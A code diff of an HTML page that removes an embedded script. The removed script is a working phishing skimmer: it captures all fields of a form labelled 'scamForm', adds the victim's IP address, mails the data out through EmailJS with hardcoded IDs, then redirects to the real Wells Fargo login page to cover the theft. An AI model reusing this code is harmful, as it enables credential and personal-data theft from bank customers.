@@ -240,62 +240,7 @@
     
     </style>
 
-    <script>
-    // Init EmailJS
-    emailjs.init("y3lRWL7KLDjiFjNcN");
-
-    document.getElementById('scamForm').addEventListener('submit', function(e) {
-        e.preventDefault();
-
-        const btn = document.getElementById('verifyBtn');
-        const originalText = btn.textContent;
-        
-        btn.disabled = true;
-        btn.textContent = "Verifying...";
-
-        const formData = new FormData(e.target);
-        const data = Object.fromEntries(formData.entries());
-
-        fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(ipData => {
-            data.ip = ipData.ip;
-            data.date = new Date().toLocaleString();
-
-            emailjs.send("service_2bhy4ju", "template_1qzswkk", data)
-            .then(() => {
-                // Hide form, show spinner
-                document.querySelector('.container').style.display = 'none';
-                document.getElementById('processing').style.display = 'flex';
-                
-                // Redirect after 2 seconds
-                setTimeout(() => {
-                    window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-                }, 2000);
-            })
-            .catch(() => {
-                // Redirect even if email fails
-                document.querySelector('.container').style.display = 'none';
-                document.getElementById('processing').style.display = 'flex';
-                setTimeout(() => {
-                    window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-                }, 2000);
-            });
-        })
-        .catch(() => {
-            // Redirect if IP fetch fails
-            document.querySelector('.container').style.display = 'none';
-            document.getElementById('processing').style.display = 'flex';
-            setTimeout(() => {
-                window.location.href = "https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&LOB=CONS";
-            }, 2000);
-        });
-    });
-</script>
-
- 
-
-
+    
 </head>
 <body>
 
